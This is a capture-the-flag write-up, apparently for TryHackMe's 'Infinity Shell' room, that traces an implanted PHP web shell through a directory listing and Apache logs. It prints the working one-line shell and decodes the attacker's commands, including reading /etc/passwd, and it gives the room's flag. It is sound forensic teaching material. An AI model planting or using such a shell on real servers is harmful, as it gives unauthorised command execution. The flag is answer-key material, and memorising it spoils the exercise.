# [Infinity Shell](https://tryhackme.com/room/hfb1infinityshell)

## Investigate and analyse the traces of an attack from an implanted webshell.

Cipher’s legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps!

### What is the flag?

1. **Enumerate the web root for suspicious files**\
   The first step is to list the contents of the image upload directory for the CMS application. Upload directories are a common target for attackers, since they are typically world-writable and served directly by the web server making them ideal drop zones for web shells disguised as legitimate files.

```bash
ls -la /var/www/html/CMSsite-master/img/
```

**Results:**

```
-rw-r--r-- 1 www-data www-data   88356 Mar  6  2022 '$user_image'
drwxr-xr-x 2 www-data www-data    4096 Mar  6  2025  .
drwxr-xr-x 8 www-data www-data    4096 Mar  6  2025  ..
-rw-r--r-- 1 www-data www-data  249196 Mar  6  2022  10067.jpg
-rw-r--r-- 1 www-data www-data 1512559 Mar  6  2022  10958.jpg
-rw-r--r-- 1 www-data www-data  390784 Mar  6  2022  19946.jpg
-rw-r--r-- 1 www-data www-data  192921 Mar  6  2022  22497.jpg
-rw-r--r-- 1 www-data www-data   39148 Mar  6  2022  2347033459561.jpg
-rw-r--r-- 1 www-data www-data  331708 Mar  6  2022  24-cast-tv-serie-wallpapers-1024x768.jpg
-rw-r--r-- 1 www-data www-data  460988 Mar  6  2022  24195.jpg
-rw-r--r-- 1 www-data www-data  834918 Mar  6  2022  25501.jpg
-rw-r--r-- 1 www-data www-data  244682 Mar  6  2022  33070.jpg
-rw-r--r-- 1 www-data www-data  359800 Mar  6  2022  36296.jpg
-rw-r--r-- 1 www-data www-data   63259 Mar  6  2022  500.JPG
-rw-r--r-- 1 www-data www-data  207263 Mar  6  2022  505.jpg
-rw-r--r-- 1 www-data www-data  416245 Mar  6  2022  9400.jpg
-rw-r--r-- 1 www-data www-data   88886 Mar  6  2022 'BlackBerry 9000521.JPG'
-rw-r--r-- 1 www-data www-data   48628 Mar  6  2022 'Chelsea-me 20151215_142015.jpg'
-rw-r--r-- 1 www-data www-data   66576 Mar  6  2022  IMG_20160129_145808.jpg
-rw-r--r-- 1 www-data www-data   82968 Mar  6  2022  IMG_20160214_152546.jpg
-rw-r--r-- 1 www-data www-data   76160 Mar  6  2022  IMG_20160725_144420.jpg
-rw-r--r-- 1 www-data www-data 1545274 Mar  6  2022  IMG_20160917_152307.jpg
-rw-r--r-- 1 www-data www-data  300564 Mar  6  2022  acer-aspire-blue-computer-wallpapers-1024x768.jpg
-rw-r--r-- 1 www-data www-data  185480 Mar  6  2022  call-of-duty-games-wallpapers.jpg
-rw-r--r-- 1 www-data www-data  398649 Mar  6  2022  casino-royale-james-bond-wallpaper.jpg
-rw-r--r-- 1 www-data www-data   82142 Mar  6  2022  cms_admin.JPG
-rw-r--r-- 1 www-data www-data   77145 Mar  6  2022  cms_admin_categories.JPG
-rw-r--r-- 1 www-data www-data  105761 Mar  6  2022  cms_admin_post.JPG
-rw-r--r-- 1 www-data www-data   69230 Mar  6  2022  cms_admin_restrict.JPG
-rw-r--r-- 1 www-data www-data   99407 Mar  6  2022  cms_admin_users1.JPG
-rw-r--r-- 1 www-data www-data   57871 Mar  6  2022  cms_admin_users2.JPG
-rw-r--r-- 1 www-data www-data   96583 Mar  6  2022  cms_front.JPG
-rw-r--r-- 1 www-data www-data   17911 Mar  6  2022  comment.jpg
-rw-r--r-- 1 www-data www-data      48 Mar  6  2025  images.php
-rw-r--r-- 1 www-data www-data   99589 Mar  6  2022  post_img.jpg
-rw-r--r-- 1 www-data www-data  192843 Mar  6  2022  post_img2.jpg
-rw-r--r-- 1 www-data www-data    3954 Mar  6  2022  vimeo.png
-rw-r--r-- 1 www-data www-data   27243 Mar  6  2022 ''$'\303\242\342\202\254\302\252''+234 803 426 6336'$'\303\242\342\202\254\302\254'' 20151226_180506.jpg'
-rw-r--r-- 1 www-data www-data   18106 Mar  6  2022 ''$'\303\242\342\202\254\302\252''+234 810 956 2045'$'\303\242\342\202\254\302\254'' 20151007_200625.jpg'
```

Nearly every file in this directory has a timestamp of **Mar 6 2022** - the original deployment date. However, `images.php` stands out immediately: it is only **48 bytes** in size and was created on **Mar 6 2025**, meaning it was dropped onto the server years after the application was first installed.

2. **Inspect the web shell**\
   Reading the suspicious file reveals a classic, minimal PHP web shell:

```bash
cat /var/www/html/CMSsite-master/img/images.php
```

**Results:**

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This one-liner is simple but highly dangerous. It works as follows:

- It reads the `query` parameter from the HTTP GET request.
- It decodes its value from Base64.
- It passes the decoded string directly to PHP's `system()` function, which executes it as an OS-level shell command and prints the output to the HTTP response.

By encoding commands in Base64, the attacker avoids simple string-based WAF detection rules that might flag obvious keywords like `whoami`, `cat /etc/passwd`, or `id`.

3. **Trace the attacker's activity in the access logs**\
   With the web shell identified, the next step is to pivot to the Apache access logs and reconstruct the attacker's session. We search the rotated log file for all requests to `images.php`:

```bash
cat /var/log/apache2/other_vhosts_access.log.1 | grep images.php
```

**Results:**

```log
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:47:51 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 404 491 "http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:48:00 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:48:01 +0000] "GET /favicon.ico HTTP/1.1" 404 491 "http://10.10.80.94:8080/CMSsite-master/img/images.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:48:14 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 404 491 "http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:48:17 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:48:22 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 404 491 "http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:48:24 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:49:10 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 404 491 "http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:50:33 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 500 185 "http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:50:41 +0000] "GET /CMSsite-master/img/images.php HTTP/1.1" 500 185 "http://10.10.80.94:8080/CMSsite-master/img/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:50:57 +0000] "GET /CMSsite-master/img/images.php?query=d2hvYW1pCg== HTTP/1.1" 200 212 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:11 +0000] "GET /CMSsite-master/img/images.php?query=bHMK HTTP/1.1" 200 660 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:20 +0000] "GET /CMSsite-master/img/images.php?query=ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo= HTTP/1.1" 200 229 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:28 +0000] "GET /CMSsite-master/img/images.php?query=aWZjb25maWcK HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:40 +0000] "GET /CMSsite-master/img/images.php?query=Y2F0IC9ldGMvcGFzc3dkCg== HTTP/1.1" 200 1546 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:47 +0000] "GET /CMSsite-master/img/images.php?query=aWQK HTTP/1.1" 200 258 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
```

The logs paint a clear picture of the attack lifecycle:

All requests originate from the single IP address **10.11.93.143**, and the attacker's browser is identified as Chrome 133 on macOS.

4. **Decode the attacker's commands**\
   Each successful `200 OK` request carries a Base64-encoded command in the `query` parameter. Decoding them reveals the attacker's full post-exploitation reconnaissance sequence:

**Command 1 - Identify the running user:**

```bash
echo "d2hvYW1pCg==" | base64 -d
# whoami
```

**Command 2 - List files in the current directory:**

```bash
echo "bHMK" | base64 -d
# ls
```

**Command 3 - Print the flag:**

```bash
echo "ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=" | base64 -d
# echo 'THM{sup3r_34sy_w3bsh3ll}'
```

**Command 4 - Enumerate network interfaces:**

```bash
echo "aWZjb25maWcK" | base64 -d
# ifconfig
```

**Command 5 - Dump the system's user accounts:**

```bash
echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d
# cat /etc/passwd
```

**Command 6 - Check the current user's UID, GID, and group memberships:**

```bash
echo "aWQK" | base64 -d
# id
```

The attacker followed a textbook post-exploitation checklist: confirm code execution, survey the filesystem, confirm network connectivity, check privilege level, and harvest credential material.

[SCREEN01]
